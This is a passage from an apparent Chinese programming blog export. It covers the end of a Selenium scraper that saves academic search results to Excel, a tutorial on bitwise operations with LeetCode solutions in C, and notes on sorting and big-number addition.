class="string">&#x27;&#x27;&#x27;//*[@id=&quot;magazine_value1&quot;]&#x27;&#x27;&#x27;</span>))).send_keys(source)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;成功输入来源:&quot;</span>,source)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检索</span></span><br><span class="line">WebDriverWait(driver, <span class="number">100</span>).until(</span><br><span class="line">        EC.presence_of_element_located((By.XPATH, <span class="string">&quot;/html/body/div[2]/div[3]/div[3]/div[2]/div[1]/div[9]&quot;</span>))).click()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;成功确认检索，得到内容.....&quot;</span>)</span><br><span class="line"><span class="comment">#获得网页内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_item</span>(<span class="params">num,col=<span class="number">1</span></span>):</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        index%=<span class="number">20</span></span><br><span class="line">        title_XPATH = <span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[2]/a&#x27;</span><span class="comment">#题名</span></span><br><span class="line">        author_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[3]&#x27;</span><span class="comment">#作者</span></span><br><span class="line">        source_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[4]&#x27;</span><span class="comment">#来源</span></span><br><span class="line">        time_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[5]&#x27;</span><span class="comment">#发布时间</span></span><br><span class="line">        database_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[6]&#x27;</span><span class="comment">#数据库</span></span><br><span class="line">        refer_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[7]&#x27;</span><span class="comment">#被引</span></span><br><span class="line">        download_XPATH=<span class="string">&#x27;//*[@id=&quot;gridTable&quot;]/div/div[2]/table/tbody/tr[&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;]/td[8]&#x27;</span><span class="comment">#下载</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            title = driver.find_element(By.XPATH, title_XPATH).text</span><br><span class="line">            author=driver.find_element(By.XPATH,author_XPATH).text</span><br><span class="line">            source = driver.find_element(By.XPATH, source_XPATH).text</span><br><span class="line">            times = driver.find_element(By.XPATH, time_XPATH).text</span><br><span class="line">            database = driver.find_element(By.XPATH, database_XPATH).text</span><br><span class="line">            refer = driver.find_element(By.XPATH, refer_XPATH).text</span><br><span class="line">            download = driver.find_element(By.XPATH, download_XPATH).text</span><br><span class="line">            link=driver.find_element(By.XPATH, title_XPATH).get_attribute(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(title,<span class="string">&quot;\t&quot;</span>,author,source,times,database,refer,download)</span><br><span class="line">            <span class="keyword">if</span> col&lt;num:<span class="comment">#写入到excel中</span></span><br><span class="line">                sheet.write(col, <span class="number">0</span>, title)</span><br><span class="line">                sheet.write(col, <span class="number">1</span>, author)</span><br><span class="line">                sheet.write(col, <span class="number">2</span>, source)</span><br><span class="line">                sheet.write(col, <span class="number">3</span>, times)</span><br><span class="line">                sheet.write(col, <span class="number">4</span>, database)</span><br><span class="line">                sheet.write(col, <span class="number">5</span>, refer)</span><br><span class="line">                sheet.write(col, <span class="number">6</span>, download)</span><br><span class="line">                sheet.write(col, <span class="number">7</span>, link)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;-----------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;所有爬取已经结束&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">            col+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;当前页爬取结束&quot;</span>)</span><br><span class="line">            index+=<span class="number">1</span></span><br><span class="line">            <span class="comment"># 进入下一页</span></span><br><span class="line">            WebDriverWait(driver, <span class="number">100</span>).until(</span><br><span class="line">                EC.presence_of_element_located((By.XPATH, <span class="string">&#x27;&#x27;&#x27;//*[@id=&quot;PageNext&quot;]&#x27;&#x27;&#x27;</span>))).click()</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;正在爬取内容.....&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------------------------------&quot;</span>)</span><br><span class="line">get_item(papers_need)</span><br><span class="line"></span><br><span class="line">workbook.save(<span class="string">&#x27;output.xls&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;爬取结果已储存在文件output.xls中&quot;</span>)</span><br><span class="line"></span><br><span class="line">driver.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>乱七八糟玩意</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>位运算</title>
    <url>/2022/09/21/%E4%BD%8D%E8%BF%90%E7%AE%97/</url>
    <content><![CDATA[<p> 位运算基础概念以及题目：</p>
<span id="more"></span>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><h4 id="位与"><a href="#位与" class="headerlink" title="位与"></a>位与</h4><p>符号：&amp;</p>
<p>12&amp;10—-&gt;1100&amp;1010（转换为二进制）</p>
<p>从低到高按位运算，当两个数字都为1，结果才为1，否则为0，因此结果为1000，也就是8</p>
<h4 id="位或"><a href="#位或" class="headerlink" title="位或"></a>位或</h4><p>符号：|</p>
<p>12|10——-&gt;1100|1010</p>
<p>从低到高按位运算，当两个数字都为0，结果才为0，否则为1，因此结果为1110，也就是14</p>
<p>小概念：相同的数异或为0，任何数与0异或为它本身，满足交换律和结合律</p>
<h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>符号：^</p>
<p>12\^10——-&gt;1100^1010</p>
<p>从低到高按位运算，当两个数字都不同，结果才为1，否则为0，因此结果为0110，也就是6。</p>
<p>从结果来看，异或可以看作不进位的加法</p>
<h4 id="左移"><a href="#左移" class="headerlink" title="左移"></a>左移</h4><p>符号：&lt;&lt;</p>
<p>12&lt;<3----->1100&lt;&lt;3</p>
<p>想左移三位，末尾补零，因此结果为1100000.另外，左移一位可以看作该数字乘二。</p>
<h4 id="右移"><a href="#右移" class="headerlink" title="右移"></a>右移</h4><p>符号: &gt;&gt;</p>
<p>12&gt;&gt;3——-&gt;1100&gt;&gt;3=1</p>
<p>右移三位，右移一位可看作除二向下取整</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="2的幂"><a href="#2的幂" class="headerlink" title="2的幂"></a>2的幂</h4><p><a href="https://leetcode.cn/problems/power-of-two/">https://leetcode.cn/problems/power-of-two/</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isPowerOfTwo</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n&gt;<span class="number">0</span>&amp;&amp;(n&amp;(n<span class="number">-1</span>))==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解析：当一个数为2的幂时，他的表达方式一定为100000….，这个数n表达方式固定，n-1则确定为0111111….。因此对n和n-1取位与，结果一定为1，因此可判断。</p>
<h4 id="4的幂"><a href="#4的幂" class="headerlink" title="4的幂"></a>4的幂</h4><p><a href="https://leetcode.cn/problems/power-of-four/">https://leetcode.cn/problems/power-of-four/</a></p>
<p>解析：分析可知：$2^{2x}mod 3=1$ 且 $2^{2x+1}mod 3=2$ 因此可以得出结论$4^xmod3=1$ 。因此，当一个数n是2的幂，同时模3为1，则他一定是4的幂</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool isPowerOfFour(int n)&#123;</span><br><span class="line">    return (n&gt;0)&amp;&amp;(n&amp;(n-1))==0&amp;&amp;n % 3==1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="位1的个数"><a href="#位1的个数" class="headerlink" title="位1的个数"></a>位1的个数</h4><p><a href="https://leetcode.cn/problems/number-of-1-bits/">https://leetcode.cn/problems/number-of-1-bits/</a></p>
<p>解析：任何一个数字的二进制表示必然可以表示为0，1的组合，当一个数字的二进制形式为….1000时我们把它减去1，则变为形式…..0111,当我们把这两个数进行位与运算，得到的结果为…..0000。我们发现最末尾的1被我们消除了，当我们重复这个过程，在这个过程中记录进行的次数，当最后n变为0时，计数结果就为1的个数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hammingWeight</span><span class="params">(<span class="type">uint32_t</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="type">int</span> ans=n&amp;(n<span class="number">-1</span>);</span><br><span class="line">        n=ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="交换数字"><a href="#交换数字" class="headerlink" title="交换数字"></a>交换数字</h4><p><a href="https://leetcode.cn/problems/swap-numbers-lcci/">https://leetcode.cn/problems/swap-numbers-lcci/</a></p>
<p>解法：</p>
<ul>
<li>a=a\^b</li>
<li>b=a\^b=a\^b\^b=a\^0=a</li>
<li>a=a\^b=a\^a\^b=b</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>* <span class="title function_">swapNumbers</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span> aSize, <span class="type">int</span>* returnSize)</span>&#123;</span><br><span class="line">    a[<span class="number">0</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    a[<span class="number">1</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    a[<span class="number">0</span>]=a[<span class="number">1</span>]^a[<span class="number">0</span>];</span><br><span class="line">    *returnSize=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="只出现一次的数字"><a href="#只出现一次的数字" class="headerlink" title="只出现一次的数字"></a>只出现一次的数字</h4><p><a href="https://leetcode.cn/problems/single-number/">https://leetcode.cn/problems/single-number/</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">singleNumber</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>&#123;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;numsSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum=sum^nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解法：很巧妙的解法，根据异或的性质，我们发现当我们从头开始循环异或，出现两次的数必然可以结合异或结果为0，最后只剩下异或结果为本身的数，这个数就是出现一次的数。(草，真的牛逼)</p>
<h4 id="汉明距离"><a href="#汉明距离" class="headerlink" title="汉明距离"></a>汉明距离</h4><p><a href="https://leetcode.cn/problems/hamming-distance/">https://leetcode.cn/problems/hamming-distance/</a></p>
<p>解析：把两个数字异或，我们发现结果为1的位上就是两个数字对应二进制位不同的位置，因此我们把异或后的结果进行1消去，同时统计1的个数，答案就是汉明距离。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hammingDistance</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">    <span class="type">int</span> n=x^y;</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        n=n&amp;(n<span class="number">-1</span>);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="交替位二进制数"><a href="#交替位二进制数" class="headerlink" title="交替位二进制数"></a>交替位二进制数</h4><p><a href="https://leetcode.cn/problems/binary-number-with-alternating-bits/">https://leetcode.cn/problems/binary-number-with-alternating-bits/</a></p>
<p>解析：题目意思可以视为判断数字n的二进制表达形式是否为01连续出现，我们判断当00和11出现时对应的十进制数字为0和3，因此我们将数字n与3位与，如果符合题意，得到的结果只能是10或者01，即为1，2，如果出现0，3，则说明n中出现了00，11的组合，则返回false。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">hasAlternatingBits</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((n&amp;<span class="number">3</span>)==<span class="number">0</span>||(n&amp;<span class="number">3</span>)==<span class="number">3</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        n=n&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="找出所有子集的异或总和再求和"><a href="#找出所有子集的异或总和再求和" class="headerlink" title="找出所有子集的异或总和再求和"></a>找出所有子集的异或总和再求和</h4><p><a href="https://leetcode.cn/problems/sum-of-all-subset-xor-totals/">https://leetcode.cn/problems/sum-of-all-subset-xor-totals/</a></p>
<p>解析：这个题我搞了半天（md我怎么这么菜），首先是我们要明白一个数组的子集个数是2的元素个数的次方，因此第一个循环是为了找到所有的子集，当我们找到所有子集之后，我们要对每一个子集进行分析，因为集合中的元素在子集中只会有两种状态，0（未出现）和1（出现），因此，<strong>每个子集都可以表示为一个二进制数字</strong>，比如数组[2,3,4]的子集之一[2,3]，用相对应的二进制数字来表示就是110。这样表示完每一个子集后，我们对每一个二进制数进行分析，当我们在二进制数中寻找到1时，说明对应的数组nums[i]在子集中存在，就可以进行异或操作了，而寻找二进制数中的1可以用一个表达式来解决:<strong>i&amp;(1&lt;&lt;j)</strong>。意思是寻找二进制数i在第j位是否为1。当第二次循环遍历二进制数位数之后，我们就可以确定存在的元素，就可以进行必要的异或和相加的操作了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">subsetXORSum</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,ans;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;(<span class="number">1</span>&lt;&lt;numsSize);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;numsSize;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i&amp;(<span class="number">1</span>&lt;&lt;j)) ans^=nums[j];</span><br><span class="line">        &#125;</span><br><span class="line">        sum+=ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="两整数之和"><a href="#两整数之和" class="headerlink" title="两整数之和"></a>两整数之和</h4><p>阴间题目，要求不能用+，-完成两数求和。</p>
<p><a href="https://leetcode.cn/problems/sum-of-two-integers/">https://leetcode.cn/problems/sum-of-two-integers/</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b==<span class="number">0</span>?a:getSum(a^b,(<span class="type">unsigned</span> <span class="type">int</span>)(a&amp;b)&lt;&lt;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析：首先已知a\^b可以表示为不考虑a和b的情况下a和b的加和，因此我们要找到进位情况下进的位的那个数字，是(a&amp;b)&lt;&lt;1，因此呢我们只要递归运算a\^b和(a&amp;b)&lt;&lt;1的和即可。每次当我们进行(a&amp;b)&lt;&lt;1时，产生的结果0，1分别代表着不进位，进位。因此，如果不进位，结果就是a\^b，即返回函数参数“a”。而当结果不为0，即连个数字都为1时，需要进位，进位则表示着这一个1在后一位相加，而后一位的相加同样可以表示为上述过程，仔细思考可以发现，递归出口在函数参数”b”为0的时候，这个时候进位完毕，输出结果a\^b就是最后答案。</p>
<h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><p><a href="https://leetcode.cn/problems/insert-into-bits-lcci/">https://leetcode.cn/problems/insert-into-bits-lcci/</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">insertBits</span><span class="params">(<span class="type">int</span> N, <span class="type">int</span> M, <span class="type">int</span> i, <span class="type">int</span> j)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=i;k&lt;=j;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        N&amp;=~((<span class="type">long</span> <span class="type">long</span>)<span class="number">1</span>&lt;&lt;k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> N|(M&lt;&lt;i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解析：博主摆烂了…</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>算法</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>基础算法01</title>
    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9501/</url>
    <content><![CDATA[<p> 这里存放一点非常基础的算法，忘记了可以来看一眼。</p>
<p>主要是：排序总结，高精度总结。</p>
<span id="more"></span>
<h3 id="排序模板"><a href="#排序模板" class="headerlink" title="排序模板"></a>排序模板</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><p>这应该是最经典的排序方法，实现也很简单，也很好理解，但是时间会慢一点，复杂度是O($n^2$)</p>
<p>原理大概意思是比较相邻的两个数，如果他们的关系是正确的，则不做操作，如不是，则交换两个数的位置，这样从头到尾进行一次之后最大的数应该是在最后的位置，这个数就是正确顺序的，就像一个泡泡一样冒到了边缘(?    再次重复这个操作，一次完成n-1，n-2，……的排序，至此排序完成。</p>
<p>核心代码如下:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)<span class="comment">//外层循环记录要大排序次数，是数组元素数量-1</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; j++)<span class="comment">//内层循环记录在一次排序下两两比较的次数，是大排序总次数减去当前排序的次数</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) <span class="built_in">swap</span>(arr[j], arr[j + <span class="number">1</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实现较为简单，因为有两层循环的缘故，时间可能较慢，另外需要注意两次循环的边界条件</p>
<h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><p>快排是c++内置sort函数的排序方法，时间会比较快，最好的情况是O($n\log_2 n$),最坏的情况是O($n^2$),平均复杂度在O($n \log_2 n$),因此用的比较多。</p>
<p>原理也比较好理解:先把整个数列分成两部分，把两边的数据和中间值比较，比中间值小的放左边，反之放右边，依次操作完毕后这个中间值就是已排序状态，然后分别用同样的方法操作左右两段数据，可以看出这是根据递归定义的排序方法，在递归最底层达到条件：找不到中间值时，整段数据已经排序完毕。这里解释的不是特别全面，有一些情况可以根据代码举个例子理解。</p>
<p>核心代码大同小异，这里我就摆一种：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">quicksort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span><span class="comment">//l,r表示数组的左右两端</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> mid=arr[(l+r)/<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> i=l,j=r;</span><br><span class="line">	<span class="keyword">while</span>(i&lt;=j)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span>(arr[i]&lt;mid) i++;</span><br><span class="line">		<span class="keyword">while</span>(arr[j]&gt;mid) j--;</span><br><span class="line">		<span class="keyword">if</span>(i&lt;=j)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">swap</span>(arr[i],arr[j]);</span><br><span class="line">			i++;</span><br><span class="line">			j--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(l&lt;j) <span class="built_in">quicksort</span>(l,j);</span><br><span class="line">	<span class="keyword">if</span>(r&gt;i) <span class="built_in">quicksort</span>(i,r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>排序就先摆两个吧，有空了再贴(画饼</p>
<h3 id="高精度计算"><a href="#高精度计算" class="headerlink" title="高精度计算"></a>高精度计算</h3><h4 id="a-b高精度"><a href="#a-b高精度" class="headerlink" title="a+b高精度"></a>a+b高精度</h4><p>高精度计算在c++中会出现是因为即使是unsigned long long型的数据最大值也就在二十位数据，也就是18446744073709551615，这样一个数据如果超过了，c++就显示不了了，会发生溢出的现象，但是在实际计算中计算大数据也不少见，因此需要用到高精度的技巧。</p>
<p>高精度一个很基础的想法就是数无法使用，那就使用数组，基本思路是使用字符串型读入数据，再转入数组之中进行操作。下一步可以理解为模拟竖式加法的做法，依次从个位开始对两个数字进行相加，大于10则保留个位并将十位上进一，依次操作到最后一位，并将结果数组倒序输出即可。</p>
<p><strong>实现代码：</strong></p>
<p>读入数组部分：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">change_arr</span><span class="params">(string a ,string b)</span><span class="comment">//转换函数，熟练之后可以和相加函数结合 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)<span class="comment">//转换注意需要倒序读入数组，因为相加需要进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]=a[i]<span class="number">-48</span>;<span class="comment">//一次只能读入一个数组，因为两个大数字位数不一定相等</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]=b[i]<span class="number">-48</span>;<span class="comment">//这里减去48可以换成&#x27;0&#x27; </span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>计算部分：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">tooplus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i]+=arr_a[i]+arr_b[i];<span class="comment">//这里必须使用+=因为要注意前一位的进位，防止丢失数据</span></span><br><span class="line">		s[i+<span class="number">1</span>]=s[i]/<span class="number">10</span>;</span><br><span class="line">		s[i]%=<span class="number">10</span>;<span class="comment">//标准操作，进位且本位取最后一位数字 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(s[temp]&gt;<span class="number">0</span>) add=<span class="number">1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>全部代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string a,b;<span class="comment">//在long long 存储不了的情况下，基本思路是通过字符串读入，转到数组进行操作 </span></span><br><span class="line"><span class="type">int</span> arr_a[<span class="number">100005</span>],arr_b[<span class="number">100005</span>],s[<span class="number">100005</span>],add=<span class="number">0</span>;<span class="comment">//s数组用于储存加完之后的数字 ,add用于处理进位的数字 </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">change_arr</span><span class="params">(string a ,string b)</span><span class="comment">//转换函数，熟练之后可以和相加函数结合 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)<span class="comment">//转换注意需要倒序读入数组，因为相加需要进位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		arr_a[a.<span class="built_in">size</span>()-i<span class="number">-1</span>]=a[i]<span class="number">-48</span>;<span class="comment">//一次只能读入一个数组，因为两个大数字位数不一定相等</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;b.<span class="built_in">size</span>();i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr_b[b.<span class="built_in">size</span>()-i<span class="number">-1</span>]=b[i]<span class="number">-48</span>;<span class="comment">//这里减去48可以换成&#x27;0&#x27; </span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tooplus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> temp=<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>());</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s[i]+=arr_a[i]+arr_b[i];<span class="comment">//这里必须使用+=因为要注意前一位的进位，防止丢失数据</span></span><br><span class="line">		s[i+<span class="number">1</span>]=s[i]/<span class="number">10</span>;</span><br><span class="line">		s[i]%=<span class="number">10</span>;<span class="comment">//标准操作，进位且本位取最后一位数字 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(s[temp]&gt;<span class="number">0</span>) add=<span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;a&gt;&gt;b;<span class="comment">//读入数据，为string型</span></span><br><span class="line">	<span class="built_in">change_arr</span>(a,b);</span><br><span class="line">	<span class="built_in">tooplus</span>();</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="built_in">max</span>(a.<span class="built_in">size</span>(),b.<span class="built_in">size</span>())+add<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)<span class="comment">//判断输出的时候是否需要输出最终多出的一位 </span></span><br><span class="line">	&#123;</span><br><span class="line">		cout&lt;&lt;s[i]; </span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="keyword">return</span> 